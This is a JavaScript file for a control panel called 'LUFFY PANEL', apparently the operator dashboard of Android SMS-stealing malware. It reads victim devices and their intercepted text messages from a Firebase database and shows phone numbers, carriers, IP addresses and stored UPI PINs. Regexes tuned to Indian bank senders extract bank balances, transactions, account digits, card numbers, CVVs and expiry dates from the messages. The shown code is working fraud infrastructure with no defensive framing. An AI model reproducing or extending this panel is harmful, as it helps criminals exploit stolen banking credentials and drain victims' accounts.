/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   LUFFY PANEL â€” app.js  v1.1
   Pure vanilla JS. Firebase REST API. No framework.
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

'use strict';

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// State
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
var STATE = {
  fbUrl: '',
  fbKey: '',
  devices: [],       // parsed device array
  filter: 'all',
  sort: 'new',
  searchQ: '',
  detailDev: null,   // currently open device
  detailSms: [],     // raw SMS for open device
  detailAnalysis: null,
  selectedSim: 1,
  smsLoaded: new Set(),  // device IDs whose SMS are fetched
  refreshTimer: null,
  smsRefreshTimer: null,
  clockTimer: null,
};

var LS_KEY = 'profex_accounts';  // same key as profex for compatibility

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// localStorage helpers
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function loadAccounts() {
  try { return JSON.parse(localStorage.getItem(LS_KEY) || '[]'); } catch(e) { return []; }
}

function saveAccounts(arr) {
  try { localStorage.setItem(LS_KEY, JSON.stringify(arr)); } catch(e) {}
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Share link helpers
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function makeShareLink(url, key) {
  var encoded = btoa(url + '|||' + key);
  return window.location.origin + window.location.pathname + '?s=' + encoded;
}

function parseShareParam() {
  var params = new URLSearchParams(window.location.search);
  var s = params.get('s');
  if (!s) return null;
  try {
    var decoded = atob(s);
    var parts = decoded.split('|||');
    if (parts.length >= 2) {
      return { url: parts[0].trim().replace(/\/$/, ''), key: parts[1].trim() };
    }
  } catch(e) {}
  return null;
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Firebase REST fetch
// URL: GET {fbUrl}/{path}.json?auth={fbKey}&{querystring}
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function fbFetch(url, key, path, qs) {
  var base = url.replace(/\/$/, '');
  var endpoint = base + '/' + path + '.json?auth=' + encodeURIComponent(key);
  if (qs) {
    for (var k in qs) {
      endpoint += '&' + encodeURIComponent(k) + '=' + encodeURIComponent(qs[k]);
    }
  }
  var resp = await fetch(endpoint);
  if (resp.status === 401 || resp.status === 403) throw new Error('PERMISSION_DENIED');
  if (resp.status === 404) throw new Error('NOT_FOUND');
  if (!resp.ok) throw new Error('HTTP ' + resp.status);
  var data = await resp.json();
  return data;
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Parse devices (matches profex field names exactly)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function parseDevices(rawData) {
  if (!rawData || typeof rawData !== 'object') return [];
  var result = [];

  // If data has a 'clients' key, use that; otherwise treat root as device map
  var source = rawData;
  if (rawData.clients && typeof rawData.clients === 'object') {
    source = rawData.clients;
  }

  for (var id in source) {
    if (!source.hasOwnProperty(id)) continue;
    var r = source[id];
    if (!r || typeof r !== 'object') continue;

    // Parse sims
    var sims = [];
    if (r.sims) {
      if (Array.isArray(r.sims)) {
        sims = r.sims.filter(Boolean);
      } else if (typeof r.sims === 'object') {
        sims = Object.values(r.sims).filter(Boolean);
      }
    }

    // Parse battery
    var bat = r.battery !== undefined ? r.battery :
              r.batLevel !== undefined ? r.batLevel :
              r.bat_level !== undefined ? r.bat_level :
              r.batteryLevel !== undefined ? r.batteryLevel : null;
    var batNum = 0;
    if (bat !== null && bat !== undefined) {
      batNum = parseInt(String(bat).replace('%', ''), 10) || 0;
    }

    // Parse status
    var status = r.status === true || r.status === 1 ||
                 String(r.status).toLowerCase() === 'online' ||
                 String(r.status).toLowerCase() === 'true';

    // Parse phone
    var phone = r.mobNo || r.phoneNumber ||
                (sims[0] && sims[0].phoneNumber ? sims[0].phoneNumber : '') || 'â€”';

    // Parse network/carrier
    var network = r.service_provider || r.operator || r.carrier ||
                  (sims[0] && sims[0].carrierName ? sims[0].carrierName : '') || null;

    // Parse lastSeen
    var lastSeen = r.lastSeen !== undefined ? r.lastSeen :
                   r.last_seen !== undefined ? r.last_seen :
                   r.lastOnline !== undefined ? r.lastOnline :
                   r.timestamp !== undefined ? r.timestamp :
                   r.dateTime !== undefined ? r.dateTime : null;

    var dev = {
      id: id,
      name: r.modelName || r.model || r.deviceName || id,
      android: r.androidV || r.androidVersion || 'â€”',
      battery: bat !== null ? (batNum + '%') : 'â€”',
      batteryPercent: batNum,
      status: status,
      isOnline: status,
      phoneNumber: phone,
      phone: phone,
      provider: network || 'â€”',
      network: network || 'â€”',
      ip: r.ip_address || r.ip || 'â€”',
      storage: r.storage || 'â€”',
      cpu: r.cpu_arch || r.cpu || 'â€”',
      sdk: r.sdkV || r.sdk || 'â€”',
      upipin: r.upipin || null,
      lastSeen: lastSeen,
      charging: !!(r.charging || r.isCharging),
      sims: sims,
      smsAnalysis: null,
    };

    result.push(dev);
  }

  return result;
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Parse raw SMS list from Firebase (object or array)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function parseSmsData(rawSms) {
  if (!rawSms || typeof rawSms !== 'object') return [];
  var msgs = [];

  if (Array.isArray(rawSms)) {
    msgs = rawSms.filter(Boolean);
  } else {
    msgs = Object.values(rawSms).filter(Boolean);
  }

  // Normalize fields
  return msgs.map(function(m) {
    return {
      sender: m.sender || m.address || m.from || '?',
      text: m.message || m.body || m.text || m.sms || '',
      time: m.time || m.date || m.timestamp || m.dateTime || '',
    };
  }).slice(-150).reverse(); // most recent first
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// SMS Analysis â€” detect bank, card, UPI
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
var BANK_SENDERS = /HDFCBK|SBIINB|ICICIB|AXISBK|KOTAKB|PNBSMS|INDBNK|BOIIND|CNRBNK|UBISMS|YESBNK|RBLBNK|IDBIBNK|IDFCBK|FEDERAL|ALLABNK|BARBNK|CANABNK|DENABNK|ORIBKK|SYNBNK|UCOBK|VJYBK|INGBNK|LKBBNK|MSFBNK|BARODBNK|PUNJNB|SBIMSG|SBIPSG|HDFCBK|PAYTMBNK|FINOBNK|EQUBK|JSFBNK|BANDHAN|SFBBNK|AUSFBN|AU-BANK|UJJBNK|SVCBNK|KARNBNK|SARASW|THANEKB|CSBBNK|DHANBNK|CTNBNK|NAINBNK|KKBKNK|TVSCRED|KVBSMS|AMBNK|MAHBNK|JKBBNK|TMEBNK|INDBBNK/i;
var BANK_BODY = /a\/c|account|balance|bal\.|credited|debited|INR|Rs\.|â‚¹|avl|available|transaction|txn/i;
var CARD_BODY = /card|cvv|credit card|debit card|xxxx|mastercard|visa|rupay|\.card/i;
var UPI_BODY = /upi|@upi|paytm|gpay|phonepe|bhim|vpa|upi\s*pin|mpin/i;
var BANK_NAME_MAP = {
  HDFCBK:'HDFC Bank', SBIINB:'SBI', ICICIB:'ICICI Bank', AXISBK:'Axis Bank',
  KOTAKB:'Kotak Bank', PNBSMS:'PNB', INDBNK:'Indian Bank', BOIIND:'Bank of India',
  CNRBNK:'Canara Bank', UBISMS:'Union Bank', YESBNK:'Yes Bank', RBLBNK:'RBL Bank',
  IDBIBNK:'IDBI Bank', IDFCBK:'IDFC First Bank', FEDERAL:'Federal Bank',
  ALLABNK:'Allahabad Bank', BARBNK:'Bank of Baroda', CANABNK:'Canara Bank',
  PAYTMBNK:'Paytm Bank', BANDHAN:'Bandhan Bank', AU:'AU Small Finance Bank',
  AUSFBN:'AU Small Finance Bank', UJJBNK:'Ujjivan SFB', SBIMSG:'SBI',
  SBIPSG:'SBI',
};

function getBankName(sender) {
  for (var code in BANK_NAME_MAP) {
    if (sender.toUpperCase().indexOf(code) !== -1) return BANK_NAME_MAP[code];
  }
  // Fallback: extract letters
  var m = sender.match(/[A-Za-z]+/);
  return m ? m[0] : sender;
}

function extractAmount(text) {
  // Match patterns like Rs. 1,234.56 or INR 1000 or â‚¹500.00
  var patterns = [
    /(?:INR|Rs\.?|â‚¹)\s*([\d,]+(?:\.\d{1,2})?)/gi,
    /([\d,]+(?:\.\d{1,2})?)\s*(?:INR|Rs\.?|â‚¹)/gi,
  ];
  var amounts = [];
  for (var i = 0; i < patterns.length; i++) {
    var m;
    var re = patterns[i];
    while ((m = re.exec(text)) !== null) {
      var val = parseFloat(m[1].replace(/,/g, ''));
      if (!isNaN(val) && val > 0) amounts.push(val);
    }
  }
  return amounts;
}

function extractBalance(text) {
  // Look for "Avl Bal" or "Available Balance" patterns
  var patterns = [
    /(?:avl|available|avbl|bal(?:ance)?)[^\d]*([\d,]+(?:\.\d{1,2})?)/i,
    /(?:bal|balance)\s*(?:is|:)?\s*(?:INR|Rs\.?|â‚¹)?\s*([\d,]+(?:\.\d{1,2})?)/i,
  ];
  for (var i = 0; i < patterns.length; i++) {
    var m = text.match(patterns[i]);
    if (m) {
      var val = parseFloat(m[1].replace(/,/g, ''));
      if (!isNaN(val)) return val;
    }
  }
  return null;
}

function analyzeSms(msgs) {
  var bankBalances = [];
  var cards = [];
  var phoneNumbers = [];
  var networks = [];

  msgs.forEach(function(m) {
    var text = m.text || '';
    var sender = m.sender || '';
    var isBankSender = BANK_SENDERS.test(sender);
    var isBankBody = BANK_BODY.test(text);

    // Bank SMS
    if (isBankSender || isBankBody) {
      var amounts = extractAmount(text);
      var balance = extractBalance(text);
      var isCredit = /credit(?:ed)?/i.test(text) && !/debit/i.test(text);
      var isDebit = /debit(?:ed)?/i.test(text);

      // Account last4
      var accMatch = text.match(/(?:a\/c|acct?|account)[^\d]*(?:xx+|XX+)?(\d{2,6})/i);
      var acc4 = accMatch ? accMatch[1].slice(-4) : null;

      if (amounts.length > 0 || balance !== null) {
        bankBalances.push({
          bankName: getBankName(sender),
          senderName: sender,
          availableBalance: balance !== null ? balance : (amounts[0] || 0),
          transactionAmount: amounts.length > 1 ? amounts[0] : (amounts[0] || null),
          transactionType: isCredit ? 'credit' : (isDebit ? 'debit' : null),
          accountLast4: acc4,
          rawSms: text,
          detectedAt: m.time,
          phoneFromSms: null,
          networkFromSms: null,
        });
      }
    }

    // Card SMS
    if (CARD_BODY.test(text)) {
      var cardMatch = text.match(/(?:xxxx|XX+)(\d{4})/i) || text.match(/(\d{4})\s*\(card\)/i);
      var cvvMatch = text.match(/cvv[\s:]*(\d{3})/i);
      var expiryMatch = text.match(/(?:expiry|exp|valid(?:\s*till)?)\s*:?\s*(\d{2}\/\d{2,4})/i);
      var cardTypeMatch = text.match(/(mastercard|visa|rupay|american express|maestro)/i);

      if (cardMatch || cvvMatch) {
        cards.push({
          cardLast4: cardMatch ? cardMatch[1] : '????',
          cvv: cvvMatch ? cvvMatch[1] : null,
          expiry: expiryMatch ? expiryMatch[1] : null,
          cardType: cardTypeMatch ? cardTypeMatch[1] : null,
          rawSms: text,
        });
      }
    }

    // Phone numbers from SMS
    var phoneMatches = text.match(/(?<![.\d])(\+?[6-9]\d{9})(?![.\d])/g);
    if (phoneMatches) {
      phoneMatches.forEach(function(p) {
        if (phoneNumbers.indexOf(p) === -1) phoneNumbers.push(p);
      });
    }

    // Networks from SMS
    var netMatch = text.match(/(?:airtel|jio|vodafone|vi\b|bsnl|idea|mtnl|cellone|docomo)/i);
    if (netMatch && networks.indexOf(netMatch[0]) === -1) {
      networks.push(netMatch[0]);
    }
  });

  return { bankBalances: bankBalances, cards: cards, phoneNumbers: phoneNumbers, networks: networks };
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Format helpers
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function formatAmount(val) {
  if (val === null || val === undefined) return '0';
  var n = typeof val === 'string' ? parseFloat(val.replace(/,/g, '')) : val;
  if (isNaN(n)) return String(val);
  return n.toLocaleString('en-IN', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function formatLastSeen(ts) {
  if (!ts) return '';
  var d;
  if (typeof ts === 'number') {
    d = new Date(ts > 1e10 ? ts : ts * 1000);
  } else {
    d = new Date(ts);
  }
  if (isNaN(d.getTime())) return String(ts).substring(0, 20);
  var now = new Date();
  var diff = now - d;
  if (diff < 60000) return 'just now';
  if (diff < 3600000) return Math.floor(diff/60000) + 'm ago';
  if (diff < 86400000) return Math.floor(diff/3600000) + 'h ago';
  return Math.floor(diff/86400000) + 'd ago';
}

function formatTimestamp(ts) {
  if (!ts) return '';
  var d;
  if (typeof ts === 'number') {
    d = new Date(ts > 1e10 ? ts : ts * 1000);
  } else {
    d = new Date(ts);
  }
  if (isNaN(d.getTime())) return String(ts);
  return d.toLocaleString('en-IN');
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Battery widget HTML
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function batBarHtml(pct) {
  var color = pct >= 60 ? '#4ade80' : pct >= 30 ? '#facc15' : '#ef4444';
  var pctSafe = Math.max(5, Math.min(100, pct));
  return '<div class="battery-widget">' +
    '<div class="battery-body">' +
    '<div class="battery-fill" style="width:' + pctSafe + '%;background:' + color + '"></div>' +
    '</div>' +
    '<div class="battery-cap"></div>' +
    '<span class="battery-pct" style="color:' + color + '">' + pct + '%</span>' +
    '</div>';
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Render device card HTML
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function renderCard(dev) {
  var analysis = dev.smsAnalysis;
  var hasBank = analysis && analysis.bankBalances && analysis.bankBalances.length > 0;
  var hasCard = analysis && analysis.cards && analysis.cards.length > 0;
  var bank0 = hasBank ? analysis.bankBalances[0] : null;

  // Phone from SMS fallback
  var phone = dev.phoneNumber && dev.phoneNumber !== 'â€”' ? dev.phoneNumber :
              (analysis && analysis.phoneNumbers && analysis.phoneNumbers[0] ? analysis.phoneNumbers[0] : 'â€”');
  // Network from SMS fallback
  var network = dev.provider && dev.provider !== 'â€”' ? dev.provider :
                (analysis && analysis.networks && analysis.networks[0] ? analysis.networks[0] : null);

  // Android display
  var androidDisplay = dev.android !== 'â€”' ? 'v' + dev.android.replace(/^v/, '') : 'â€”';

  // Last seen
  var lastSeenStr = dev.lastSeen ? formatLastSeen(dev.lastSeen) : '';

  var html = '<div class="device-card' + (dev.status ? ' online' : '') + '" id="card-' + dev.id + '" onclick="openDetail(\'' + escId(dev.id) + '\')">';

  // Header
  html += '<div class="card-header">';
  html += '<div class="card-wifi-icon' + (dev.status ? ' online' : '') + '">';
  html += '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z"/></svg>';
  html += '</div>';
  html += '<div class="card-name-wrap">';
  html += '<h3 class="card-name">' + escHtml(dev.name) + '</h3>';
  html += '<p class="card-id">' + escHtml(dev.id.substring(0, 18)) + '</p>';
  html += '</div>';
  html += '<div class="card-badges">';
  if (dev.upipin) html += '<svg class="badge-upi" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z"/></svg>';
  if (hasBank) html += '<svg class="badge-bank" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 18.75a60.07 60.07 0 0115.797 2.101c.727.198 1.453-.342 1.453-1.096V18.75M3.75 4.5v.75A.75.75 0 013 6h-.75m0 0v-.375c0-.621.504-1.125 1.125-1.125H20.25M2.25 6v9m18-10.5v.75c0 .414.336.75.75.75h.75m-1.5-1.5h.375c.621 0 1.125.504 1.125 1.125v9.75c0 .621-.504 1.125-1.125 1.125h-.375m1.5-1.5H21a.75.75 0 00-.75.75v.75m0 0H3.75m0 0h-.375a1.125 1.125 0 01-1.125-1.125V15m1.5 1.5v-.75A.75.75 0 003 15h-.75M15 10.5a3 3 0 11-6 0 3 3 0 016 0zm3 0h.008v.008H18V10.5zm-12 0h.008v.008H6V10.5z"/></svg>';
  if (hasCard) html += '<svg class="badge-card-b" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 8.25h19.5M2.25 9h19.5m-16.5 5.25h6m-6 2.25h3m-3.75 3h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25v10.5A2.25 2.25 0 004.5 19.5z"/></svg>';
  html += '</div>';
  html += '</div>'; // /card-header

  // 2Ã—2 grid
  html += '<div class="card-fields">';
  html += '<div>';
  html += '<p class="card-field-label">Android</p>';
  html += '<p class="card-field-value">' + escHtml(androidDisplay) + '</p>';
  html += '</div>';
  html += '<div>';
  html += '<p class="card-field-label">Battery</p>';
  html += batBarHtml(dev.batteryPercent);
  html += '</div>';
  html += '</div>';

  html += '<div class="card-fields">';
  html += '<div>';
  html += '<p class="card-field-label">Number</p>';
  html += '<p class="card-field-mono">' + escHtml(phone) + '</p>';
  html += '</div>';
  if (network) {
    html += '<div>';
    html += '<p class="card-field-label">Network</p>';
    html += '<p class="card-field-value">' + escHtml(network) + '</p>';
    html += '</div>';
  }
  html += '</div>';

  // Bank row
  if (bank0) {
    var txnClass = bank0.transactionType === 'credit' ? '' : ' debit';
    var txnSign = bank0.transactionType === 'credit' ? '+' : '-';
    html += '<div class="card-bank-row">';
    html += '<span class="card-bank-name">';
    html += '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:0.875rem;height:0.875rem"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 18.75a60.07 60.07 0 0115.797 2.101c.727.198 1.453-.342 1.453-1.096V18.75M3.75 4.5v.75A.75.75 0 013 6h-.75m0 0v-.375c0-.621.504-1.125 1.125-1.125H20.25M2.25 6v9m18-10.5v.75c0 .414.336.75.75.75h.75m-1.5-1.5h.375c.621 0 1.125.504 1.125 1.125v9.75c0 .621-.504 1.125-1.125 1.125h-.375m1.5-1.5H21a.75.75 0 00-.75.75v.75m0 0H3.75m0 0h-.375a1.125 1.125 0 01-1.125-1.125V15m1.5 1.5v-.75A.75.75 0 003 15h-.75M15 10.5a3 3 0 11-6 0 3 3 0 016 0zm3 0h.008v.008H18V10.5zm-12 0h.008v.008H6V10.5z"/></svg>';
    html += '&#8377; ' + escHtml(bank0.bankName);
    html += '</span>';
    html += '<span class="card-bank-amount">&#8377;' + formatAmount(bank0.availableBalance) + '</span>';
    if (bank0.transactionAmount) {
      html += '<span class="card-bank-txn' + txnClass + '">' + txnSign + '&#8377;' + formatAmount(bank0.transactionAmount) + ' ' + (bank0.transactionType || '') + '</span>';
    }
    html += '</div>';
  }

  // Footer
  html += '<div class="card-footer">';
  html += '<span class="status-dot ' + (dev.status ? 'online' : 'offline') + '"></span>';
  if (dev.status) {
    html += '<span class="status-text online">Online</span>';
  } else {
    html += '<span class="status-text offline">Offline</span>';
    if (lastSeenStr) html += '<span class="last-seen">' + escHtml(lastSeenStr) + '</span>';
  }
  if (dev.upipin) html += '<span class="upi-badge">UPI PIN</span>';
  html += '</div>';

  html += '</div>'; // /device-card
  return html;
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Skeleton cards
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function renderSkeletons(count) {
  var html = '';
  for (var i = 0; i < count; i++) {
    html += '<div class="skeleton-card">';
    html += '<div class="skel-header"><div class="skel-box skel-w10-h10"></div>';
    html += '<div style="flex:1"><div class="skel-line1"></div><div class="skel-line2"></div></div></div>';
    html += '<div class="skel-grid"><div class="skel-field"></div><div class="skel-field"></div></div>';
    html += '<div class="skel-footer"></div>';
    html += '</div>';
  }
  return html;
}

